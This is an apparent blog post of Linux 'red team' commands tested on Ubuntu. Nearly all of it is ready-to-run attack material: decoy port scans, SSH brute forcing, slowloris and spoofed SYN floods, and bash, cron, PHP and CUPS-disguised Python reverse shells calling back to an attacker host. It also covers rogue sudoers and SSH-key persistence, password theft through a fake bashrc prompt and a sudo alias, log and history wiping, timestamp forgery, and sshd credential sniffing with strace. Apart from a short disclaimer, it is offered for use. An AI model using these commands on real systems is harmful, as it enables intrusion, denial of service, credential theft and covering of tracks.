---
layout: post
title: Red Team Tricks with Linux
date: 2019-09-16 21:46:25.000000000 +03:00
categories:
- Linux
- Linux as a server
tags:
- Bash
- Linux
- Red Team
- Reverse shell
- Server
- SSH
- Ubuntu
- Ubuntu 16.04
permalink: "/2019/red-team-tricks-with-linux/"
---
<p>I have collected some Linux commands and tricks that Red Team can use for their evil deeds. All these commands and tricks have been tested against Ubuntu 16.04 server and attackers computer is Kali Linux 2019.3.</p>
<h2>Legal disclaimer</h2>
<p>The methods are presented for educational purposes only.<br />
<strong>You are responsible</strong> for not using the techniques for <strong>illegal purposes</strong>.</p>
<h2>Label meanings</h2>
<p><strong>[victim ip address]</strong> means add your target IP address example 127.0.0.1<br />
<strong>[victim ip address zone]</strong> means add your target IP address zone example 10.1.1.0/24<br />
<strong>[decoy ip address]</strong> means add a decoy address that you want to frame to be the attacker example 127.0.0.2<br />
<strong>[domain]</strong> means add a victim domain example localhost<br />
<strong>[username]</strong> means add a username example admin<br />
<strong>[attacker domain]</strong> means add a hostile computer's ip address example 127.0.0.3<br />
<strong>[target folder/file]</strong> means add a target folder or file that you want to change example /home/username/newfile<br />
<strong>[source folder/file]</strong> means add a source folder or file that you want to use as reference example /bin</p>
<h1>Scanning and denying</h1>
<h2>Nmap</h2>
<p>Nmap is a network scanning tool.</p>
<p>Scan 1000 most common ports. Delay is about 1 second.</p>
<pre># nmap --top-ports 1000 -T2 [victim ip address]</pre>
<p>Scan all ports aggressively</p>
<pre># nmap -p- -T4 [victim ip address]</pre>
<p>Try to determine Operation system. Scan 1000 most common ports and try to determine service and version.</p>
<pre># nmap -O -sV --top-ports 1000 -T4 [victim ip address]</pre>
<p>Scan insane fast in parallel and use decoys. In a target computer it looks like 3 different IP addresses are trying to scan it ports.</p>
<pre># nmap -p- -T5 --min-parallelism 5 [victim ip address zone] -D[decoy ip address],[decoy ip address]</pre>
<h2>Hydra</h2>
<p>Hydra is a brute force tool.</p>
<p>Brute forcing SSH account. Try to brute force 4 length password that contains only letters a and o. Delay is 1 second. Brute forcing is stopped if correct username and password is found.</p>
<pre># hydra -f -t 1 -l [username] -V -x 4:4:ao [victim ip address] ssh</pre>
<h2>Slowhttptest</h2>
<p>Slowlori attack is opening connections to HTTP server and keeps connections open. This makes web server to be very slow or unreachable.</p>
<p>Open 1000 connection and send only unfinished HTTP requests. Open 200 new connections per second and keep connections open by sending GET method in every 10 second with maximum length of 24 and wait 3 seconds for response.</p>
<pre># slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://[victim ip address or domain] -x 24 -p 3</pre>
<h2>DOS</h2>
<p>Take lot of TCP connections to target</p>
<pre># nping --tcp-connect --rate=1000000 --count 1000000 [victim ip address or domain]</pre>
<p>Send much as possible TCP connections to target to port 21 and change source address to a decoy IP address. Flood by sending 10000 packets using SYN flag and data size is 120.</p>
<pre>$ sudo hping3 -V -c 10000 -d 120 -S -p 21 --flood [victim ip address] -a [decoy ip address]</pre>
<h1>Reverse shells</h1>
<h2>Bash reverse shell</h2>
<p>In attacker's computer listen 51920 port using Netcat</p>
<pre># nc -l -p 51920</pre>
<p>Victim is connecting to attacker and opening reverse shell</p>
<pre># /bin/bash -i &gt;&amp; /dev/tcp/[attacker ip address]/51920 0&gt;&amp;1</pre>
<p>You can also create a script that will try to open a reverse shell in every 5 minute</p>
<pre># nano /etc/cron.d/update_check
*/5 * * * * root /bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/[attacker ip address]/51920 0&gt;&amp;1'</pre>
<h2>Reverse shell using PHP site</h2>
<p>Install Apache and PHP to victim's computer and create PHP file that will open a reverse shell when the page is requested by HTTP protocol.</p>
<pre># apt install apache2 php libapache2-mod-php
# adduser www-data sudo
# passwd www-data

# nano /var/www/html/example.php
&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/" . $_GET["x"] . "/" . $_GET["y"] . " 0&gt;&amp;1'"); ?&gt;

# touch /var/www/html/example.php -r /var/www/html/index.html
# service apache2 restart
</pre>
<p>In attacker's computer listen 51920 port using Netcat and send HTTP request to malicious site. With HTTP request the victim's computer will open the reverse shell</p>
<pre># nc -l -p 51920
# curl 'http://[victim ip address]/example.php?x=[attacker domain]&amp;y=51920'</pre>
<p>This is how you can give password using only one line example in reverse shell</p>
<pre>$ echo 'password' | sudo -S command
</pre>
<h2>Python site reverse shell and fake it to look like CUPS</h2>
<p>Give a sudo rights to user nobody without need to give a password</p>
<pre># nano /etc/sudoers.d/nobody
nobody ALL=(ALL) NOPASSWD:ALL</pre>
<p>Fake Python to look like CUPS, create a Python script and start a Python server</p>
<pre># python -V
Python 2.7.12

# cp /usr/bin/python /usr/bin/cups
# mkdir -p /var/www/cgi-bin
# nano /var/www/cgi-bin/index.py

#! /usr/bin/cups  
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("[attacker domain]",51920));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);

# chmod a+x /var/www/cgi-bin/index.py
# cd /var/www/
# /usr/bin/cups -m CGIHTTPServer 631
</pre>
<p>If you would NMAP victim's computer with default options it would look like ipp(CUPS) service is running</p>
<pre># nmap -p 631 [victim ip address]
PORT    STATE SERVICE
631/tcp open  ipp
</pre>
<p>In attacker's computer listen 51920 port using Netcat and send HTTP request to malicious site</p>
<pre># nc -l -p 51920
# curl 'http://[victim ip address]:631/cgi-bin/index.py'
</pre>
<h1>SSH tricks and stealing passwords</h1>
<h2>SSH listening different port using reverse shell</h2>
<p>Add PORT 2222 end of the /etc/ssh/sshd_config</p>
<pre># echo PORT 2222 &gt;&gt; /etc/ssh/sshd_config</pre>
<p>Restart SSH daemon</p>
<pre># service ssh restart</pre>
<p>Now you can take SSH to port 2222</p>
<pre># ssh [username]@[victim ip address] -p 2222</pre>
<h2>SSH Public Key Authentication</h2>
<p>Create key pair on hostile's computer, move public key to victim's computer and take SSH connection to it</p>
<pre># ssh-keygen
# ssh-copy-id [username]@[victim ip address]
# ssh [username]@[victim ip address]
</pre>
<p>On victim's computer modify sshd_config allow the root to login, change SSH to find public keys also from /etc/ssh/authorized_keys and move public key to that location.</p>
<pre># nano /etc/ssh/sshd_config
PermitRootLogin yes
AuthorizedKeysFile %h/.ssh/authorized_keys /etc/ssh/authorized_keys

# cp /home/[username]/.ssh/authorized_keys /etc/ssh/
# chown root:root /etc/ssh/authorized_keys
# chmod +r /etc/ssh/authorized_keys
# service ssh restart
# touch /etc/ssh/sshd_config -r /srv
# touch /etc/ssh/authorized_keys -r /srv
</pre>
<p>Now you can take SSH connection without password using root (or any other user) from hostile computer</p>
<pre># ssh root@[victim ip address]
</pre>
<h2>Steal SSH password using bashrc</h2>
<p>Modify bash.bashrc so it looks like first password went wrong and you need to write it again, but actually it steals victim's password and adds it to a file</p>
<pre># nano /etc/bash.bashrc</pre>
<p>Add these line to end of the bash.bashrc file</p>
<pre>clear
echo "$(whoami)@$(hostname -I)'s password:"
echo "Permission denied, please try again."
read -s -p "$(whoami)@$(hostname -I)'s password: "  password
echo "$password" &gt;&gt; /tmp/password.txt
echo   
</pre>
<h2>Sudo alias and steal sudo password</h2>
<p><strong>This needs permanent solution to add alias and better way to do cut</strong><br />
Create file that asks sudo password, runs the last command and steals the password and adds it to a file</p>
<pre># nano /bin/admin
read -s -p "[sudo] password for $(whoami): "  password
echo
echo $password &gt;&gt; /tmp/sudo_password.txt
echo $password | /usr/bin/sudo -S $(history 1 | cut -c 13-)  
</pre>
<p>Give execute permissions to that file and give the script to sudo alias</p>
<pre># chmod +rx /bin/admin
# alias sudo="/bin/admin"
</pre>
<p>Now every time victim is running sudo [command] script asks password, steals the password and runs the command what victim wanted to run.</p>
<p>After this we can hide this alias modification by modifying the alias command</p>
<pre># alias &gt; /bin/alias_old
# alias alias="cat /bin/alias_old"
</pre>
<h1>Cleaning your evil deeds</h1>
<h2>Erasing history</h2>
<p>Remove old history</p>
<pre># rm -r ~/.bash_history</pre>
<p>Clean session history and exit</p>
<pre># history -c &amp;&amp; exit</pre>
<p>Link history to /dev/null so history does not save anything</p>
<pre># ln -sf /dev/null ~/.bash_history</pre>
<h2>Clean logs</h2>
<p>Delete all useful log files</p>
<pre># rm -r /var/log/apache2
# rm -r /var/log/apt
# rm /var/log/mail*
# rm /var/log/dpkg.log
# rm /var/log/syslog*
# rm /var/log/auth*
</pre>
<h2>Folder and File time modifications</h2>
<p>Check a folder or a file creation and modification time</p>
<pre># stat [target folder/file]</pre>
<p>Change a folder or a file creation and modification time to YYYYMMDDhhmm</p>
<pre># touch -t 201212211111 [target folder/file]</pre>
<p>Change a folder or a file modification time to YYYYMMDDhhmm</p>
<pre># touch -mt 201212211111 [target folder/file]</pre>
<p>Copy creation and modification time from other file or folder</p>
<pre># touch [target folder/file] -r [source folder/file]</pre>
<p>List all files that has been changed in 7 days</p>
<pre># find [target folder] -iname "*" -atime -7 -type f</pre>
<p>List all folders that has been changed in 7 days</p>
<pre># find [target folder] -iname "*" -atime -7 -type d</pre>
<p>Change creation and modification time for all files that has been modified in 7 days</p>
<pre># touch -t 201212211111 $(find [target folder] -iname "*" -atime -7 -type f)</pre>
<p>Change creation and modification time for all folders that has been modified in 7 days</p>
<pre># touch -t 201212211111 $(find [target folder] -iname "*" -atime -7 -type d)</pre>
<p>Copy creation and modification time for all files that has been modified in 7 days. Source folder could be something like /bin</p>
<pre># touch $(find [target folder] -iname "*" -atime -7 -type f) -r [source folder/file]</pre>
<h1>*******************************</h1>
<h1>UNDER THIS DOES NOT WORK YEAT</h1>
<h1>*******************************</h1>
<h2>Get SSH credentials using strace</h2>
<pre>$ sudo strace -f -p $(pgrep -o sshd) -o sniff.txt -e trace=write
$ sudo /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2&gt;&amp;1 | grep '\\0\\0\\0\\4\|\\0\\0\\0\\10'
$ /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2&gt;&amp;1 | grep --line-buffered '\\0\\0\\0\\5\|\\0\\0\\0\\10' &gt;&gt; tiedosto.txt
$ /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2&gt;&amp;1 | grep --line-buffered -e "$(/bin/hostname)" -e '\\0\\0\\0\\10' &gt;&gt; tiedosto.txt
$ (/usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2&gt;&amp;1 | grep --line-buffered -e "$(/bin/hostname)" -e '\\0\\0\\0\\10' &gt;&gt; /var/gnome.1) &amp;
</pre>
<p>strace with reverse shell</p>
<pre>$ sed -i -e 's/KillMode=process/KillMode=process\nExecStartPost=\/etc\/systemd\/system\/sshd.sh/g' /lib/systemd/system/ssh.service
$ printf '#!/bin/bash\n/usr/bin/strace -f -p $MAINPID -e trace=write 2&gt;&amp;1 | grep --line-buffered -e "$(/bin/hostname)" -e ' &gt; /etc/systemd/system/sshd.sh
$ echo "'\\\\0\\\\0\\\\0\\\\10' &gt;&gt; /var/gnome.1 &amp;" &gt;&gt; /etc/systemd/system/sshd.sh

$ chmod +x /etc/systemd/system/sshd.sh
$ systemctl daemon-reload
$ service ssh restart
</pre>
<p>strace with ssh</p>
<pre>$ sudoedit /lib/systemd/system/ssh.service
ExecStartPost=/etc/systemd/system/sshd.sh

$ sudoedit /etc/systemd/system/sshd.sh
#!/bin/bash
(/usr/bin/strace -f -p $MAINPID -e trace=write 2&gt;&amp;1 | grep --line-buffered -e "$(/bin/hostname)" -e '\\0\\0\\0\\10' &gt;&gt; /var/gnome.1) &amp;

$ chmod +x /etc/systemd/system/sshd.sh
$ systemctl daemon-reload
$ service ssh restart
</pre>
<p>grepping the password and username</p>
<pre>$ cat sniff.txt | cut -d ' ' -f 4 | sort | uniq -c | sort -nr
$ grep '\\0\\0\\0\\10' sniff.txt
käyttäjä
$ grep '\\0\\0\\0\\4' sniff.txt
$ grep '@computer' sniff.txt
</pre>
<h2>DNS tunneling</h2>
<pre>$ apt-get install iodine</pre>
<p>Server to listen</p>
<pre># iodined -f -P 12345 [target ip address] [hostile domain]</pre>
<p>Client</p>
<pre>$ sudo iodine -f -P 12345 -r [hostile domain]</pre>
<h2>SPAM mail</h2>
<h2>Windows create traffic using curl</h2>
<pre>set list=http://localhost1 http://localhost2
set list2=http://localhost3 http://localhost3

:loop
set /A test=%RANDOM% * 20 / 32768 + 1 + 20

ipconfig /flushdns

(for %%a in (%list%) do (
REM Chrome
	curl.exe -kLI "%%a"  -H "cache-control: max-age=0" -H "upgrade-insecure-requests: 1" -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" -H "sec-fetch-mode: navigate" -H "sec-fetch-user: ?1" -H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "sec-fetch-site: none" -H "accept-encoding: gzip, deflate, br" -H "accept-language: en-US,en;q=0.9,fi;q=0.8"
	timeout %test%
))

(for %%a in (%list2%) do (
REM Firefox
	curl.exe -kLI "%%a"  -H "cache-control: max-age=0" -H "upgrade-insecure-requests: 1" -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "sec-fetch-mode: navigate" -H "sec-fetch-user: ?1" -H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "sec-fetch-site: none" -H "accept-encoding: gzip, deflate, br" -H "accept-language: en-US,en;q=0.9,fi;q=0.8"
	timeout %test%
))

goto loop
</pre>
<p>https://linux.die.net/man/1/knockd<br />
AXFR query using tcp connection to port 53</p>